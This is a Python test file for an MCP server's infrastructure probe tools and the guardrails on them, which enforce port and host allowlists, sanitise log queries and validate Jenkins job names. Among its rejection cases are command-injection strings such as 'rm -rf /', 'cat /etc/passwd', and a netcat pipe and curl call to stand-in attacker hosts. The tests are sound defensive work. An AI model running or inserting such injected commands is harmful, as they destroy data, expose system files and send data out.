"""Tests for the server/monitoring probe tools and infra guardrails.

Sets infra env vars at module top BEFORE importing mcp_server modules so the
`config_infra` cache is built with the test allowlist.
"""

from __future__ import annotations

import asyncio
import os

os.environ.setdefault("JENKINS_URL", "https://ci.example.com")
os.environ.setdefault("JENKINS_USERNAME", "bot")
os.environ.setdefault("JENKINS_API_TOKEN", "fake-jenkins-token")
os.environ.setdefault("JENKINS_WEBHOOK_SECRET", "fake-webhook-secret-12345678")
os.environ.setdefault("GCHAT_WEBHOOK_URL", "https://chat.googleapis.com/v1/spaces/x/messages?key=k&token=t")
os.environ.setdefault("ALLOWED_MONITORING_DOMAINS", "monitor.example.com,logs.example.com")

import httpx
import pytest
import respx

from mcp_server import config_infra
from mcp_server.guardrails_infra import (
    InfraGuardrailError,
    get_infra_guardrails,
)
from mcp_server.tools.server import (
    server_check_resources,
    server_check_services,
    server_check_status,
    server_read_logs,
)

config_infra.reset_infra_settings_cache()


# =============================================================================
# guardrails_infra parametrized tests
# =============================================================================


@pytest.fixture
def guards():
    return get_infra_guardrails()


# ---- port allowlist --------------------------------------------------------


@pytest.mark.parametrize("port", [80, 443, 8080, 8443, 5432, 6379, 9090, 9100])
def test_allowed_ports_accepted(guards, port):
    guards.enforce_allowed_port(port)


@pytest.mark.parametrize("port", [22, 23, 25, 21, 7777, 31337])
def test_disallowed_ports_rejected(guards, port):
    with pytest.raises(InfraGuardrailError) as exc:
        guards.enforce_allowed_port(port)
    assert exc.value.code == "port_not_allowed"


@pytest.mark.parametrize("port", [0, -1, 65536, 70000])
def test_invalid_ports_rejected(guards, port):
    with pytest.raises(InfraGuardrailError) as exc:
        guards.enforce_allowed_port(port)
    assert exc.value.code == "invalid_port"


def test_ports_list_must_not_be_empty(guards):
    with pytest.raises(InfraGuardrailError) as exc:
        guards.enforce_allowed_ports([])
    assert exc.value.code == "empty_ports"


def test_ports_list_capped(guards):
    with pytest.raises(InfraGuardrailError) as exc:
        guards.enforce_allowed_ports([80] * 33)
    assert exc.value.code == "too_many_ports"


# ---- URL / host allowlist --------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "http://monitor.example.com/metrics",
        "https://monitor.example.com/healthz",
        "https://logs.example.com/loki/api/v1/query_range",
    ],
)
def test_allowed_urls_accepted(guards, url):
    assert guards.enforce_allowed_url(url) == url


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example.com/metrics",
        "https://internal-not-listed.example.com/metrics",
        "ftp://monitor.example.com/x",
        "file:///etc/passwd",
        "",
    ],
)
def test_disallowed_urls_rejected(guards, url):
    with pytest.raises(InfraGuardrailError):
        guards.enforce_allowed_url(url)


def test_host_allowlist_is_case_insensitive(guards):
    assert guards.enforce_allowed_host("Monitor.Example.COM") == "monitor.example.com"


# ---- log query sanitization ------------------------------------------------


@pytest.mark.parametrize(
    "query",
    [
        'level=error service="checkout"',
        "app=foo level=warn http_status=500",
        "service=checkout error timeout connection reset",
    ],
)
def test_clean_queries_accepted(guards, query):
    assert guards.sanitize_log_query(query) == query


@pytest.mark.parametrize(
    "query",
    [
        "level=error; rm -rf /",
        "x && cat /etc/passwd",
        "foo`whoami`",
        "x | nc attacker.example.com 4444",
        "$(curl evil.example.com)",
        "x > /dev/null",
    ],
)
def test_dirty_queries_rejected(guards, query):
    with pytest.raises(InfraGuardrailError) as exc:
        guards.sanitize_log_query(query)
    assert exc.value.code == "query_metacharacter"


# ---- Jenkins job-name validation -------------------------------------------


@pytest.mark.parametrize(
    "name",
    ["deploy-api", "Folder/SubFolder/job-name", "release_1.2", "build.test"],
)
def test_valid_jenkins_job_names_accepted(guards, name):
    assert guards.validate_jenkins_job_name(name) == name


@pytest.mark.parametrize(
    "name",
    [
        "../etc/passwd",
        "deploy;rm-rf",
        "deploy && evil",
        "job with spaces",
        "job|pipe",
        "",
    ],
)
def test_invalid_jenkins_job_names_rejected(guards, name):
    with pytest.raises(InfraGuardrailError):
        guards.validate_jenkins_job_name(name)


# =============================================================================
# server_check_status
# =============================================================================


async def test_server_check_status_rejects_non_allowlisted_host():
    result = await server_check_status({"url": "https://evil.example.com/healthz"})
    assert result["ok"] is False
    assert result["error"] == "host_not_allowed"


@respx.mock
async def test_server_check_status_happy_path():
    respx.get("https://monitor.example.com/healthz").mock(
        return_value=httpx.Response(200, text="ok")
    )
    result = await server_check_status({"url": "https://monitor.example.com/healthz"})
    assert result["ok"] is True
    assert result["reachable"] is True
    assert result["status_code"] == 200
    assert result["healthy"] is True
    assert isinstance(result["response_time_ms"], int)


@respx.mock
async def test_server_check_status_marks_5xx_unhealthy():
    respx.get("https://monitor.example.com/healthz").mock(
        return_value=httpx.Response(503, text="oops")
    )
    result = await server_check_status({"url": "https://monitor.example.com/healthz"})
    assert result["ok"] is True
    assert result["healthy"] is False
    assert result["status_code"] == 503


@respx.mock
async def test_server_check_status_reports_unreachable_on_connection_error():
    respx.get("https://monitor.example.com/healthz").mock(
        side_effect=httpx.ConnectError("nope")
    )
    result = await server_check_status({"url": "https://monitor.example.com/healthz"})
    assert result["ok"] is True
    assert result["reachable"] is False


# =============================================================================
# server_check_resources
# =============================================================================


async def test_server_check_resources_rejects_disallowed_host():
    result = await server_check_resources(
        {"monitoring_url": "https://evil.example.com/metrics"}
    )
    assert result["ok"] is False
    assert result["error"] == "host_not_allowed"


@respx.mock
async def test_server_check_resources_returns_text_body():
    respx.get("https://monitor.example.com/metrics").mock(
        return_value=httpx.Response(
            200,
            text="# HELP node_load1\nnode_load1 0.42\n",
            headers={"content-type": "text/plain"},
        )
    )
    result = await server_check_resources(
        {"monitoring_url": "https://monitor.example.com/metrics"}
    )
    assert result["ok"] is True
    assert "node_load1 0.42" in result["raw_body"]
    assert result["data"] is None


@respx.mock
async def test_server_check_resources_parses_json():
    respx.get("https://monitor.example.com/health").mock(
        return_value=httpx.Response(
            200,
            json={"disk_pct": 87, "mem_pct": 42},
            headers={"content-type": "application/json"},
        )
    )
    result = await server_check_resources(
        {"monitoring_url": "https://monitor.example.com/health"}
    )
    assert result["ok"] is True
    assert result["data"] == {"disk_pct": 87, "mem_pct": 42}


# =============================================================================
# server_check_services (socket connect)
# =============================================================================


class _FakeStreamWriter:
    def __init__(self) -> None:
        self.closed = False

    def close(self) -> None:
        self.closed = True

    async def wait_closed(self) -> None:
        return None


async def test_server_check_services_rejects_non_allowlisted_host():
    result = await server_check_services({"host": "evil.example.com", "ports": [80]})
    assert result["ok"] is False
    assert result["error"] == "host_not_allowed"


async def test_server_check_services_rejects_non_allowlisted_port():
    result = await server_check_services(
        {"host": "monitor.example.com", "ports": [22]}  # ssh not allowed
    )
    assert result["ok"] is False
    assert result["error"] == "port_not_allowed"


async def test_server_check_services_happy_path(monkeypatch):
    async def fake_open_connection(host, port):
        return (object(), _FakeStreamWriter())

    monkeypatch.setattr(asyncio, "open_connection", fake_open_connection)
    result = await server_check_services(
        {"host": "monitor.example.com", "ports": [5432, 6379]}
    )
    assert result["ok"] is True
    assert [r["port"] for r in result["results"]] == [5432, 6379]
    assert all(r["reachable"] is True for r in result["results"])


async def test_server_check_services_reports_timeout(monkeypatch):
    async def fake_open_connection(host, port):
        raise TimeoutError()

    monkeypatch.setattr(asyncio, "open_connection", fake_open_connection)
    result = await server_check_services(
        {"host": "monitor.example.com", "ports": [5432]}
    )
    assert result["ok"] is True
    assert result["results"][0]["reachable"] is False


async def test_server_check_services_reports_connect_error(monkeypatch):
    async def fake_open_connection(host, port):
        raise ConnectionRefusedError()

    monkeypatch.setattr(asyncio, "open_connection", fake_open_connection)
    result = await server_check_services(
        {"host": "monitor.example.com", "ports": [5432]}
    )
    assert result["ok"] is True
    assert result["results"][0]["reachable"] is False
    assert "connect_error" in result["results"][0]["reason"]


# =============================================================================
# server_read_logs
# =============================================================================


async def test_server_read_logs_rejects_metachars_in_query():
    result = await server_read_logs(
        {
            "logs_url": "https://logs.example.com/loki/api/v1/query_range",
            "query": "level=error; rm -rf /",
            "limit": 50,
        }
    )
    assert result["ok"] is False
    assert result["error"] == "query_metacharacter"


async def test_server_read_logs_rejects_disallowed_host():
    result = await server_read_logs(
        {
            "logs_url": "https://evil.example.com/query",
            "query": "level=error",
            "limit": 50,
        }
    )
    assert result["ok"] is False
    assert result["error"] == "host_not_allowed"


@respx.mock
async def test_server_read_logs_happy_path():
    respx.get("https://logs.example.com/loki/api/v1/query_range").mock(
        return_value=httpx.Response(
            200,
            json={"status": "success", "data": {"result": []}},
            headers={"content-type": "application/json"},
        )
    )
    result = await server_read_logs(
        {
            "logs_url": "https://logs.example.com/loki/api/v1/query_range",
            "query": 'level=error service="checkout"',
            "limit": 10,
        }
    )
    assert result["ok"] is True
    assert result["data"]["status"] == "success"
    assert result["limit"] == 10
